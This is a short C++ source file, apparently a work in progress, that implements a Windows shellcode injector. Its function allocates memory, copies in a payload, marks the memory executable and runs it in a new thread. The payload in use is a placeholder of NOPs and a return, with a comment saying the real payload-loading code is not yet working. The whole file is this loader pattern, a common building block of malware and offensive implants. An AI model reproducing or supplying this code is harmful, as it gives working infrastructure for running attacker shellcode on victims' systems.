#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <iostream>

int injector(std::vector<uint8_t> payloadVector) {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    //this works - so somethings up with the vector access w/ memory
    std::cout << "[?] Using temp payload of \\x90\\x90\\x90\\xC3 cuz the payload is being dumb" << std::endl;
    const char* payload = "\x90\x90\x90\xC3";
    unsigned int payload_len = 4;

 /*   unsigned char* payload = payloadVector.data();
    unsigned int payload_len = payloadVector.size();*/

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == nullptr) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return 1;
    }

    RtlMoveMemory(exec_mem, payload, payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv == 0) {
        std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
        return 1;
    }

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (th == nullptr) {
        std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
        return 1;
    }

    //Wait for the thread to finish 
    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);

    return 0;
}

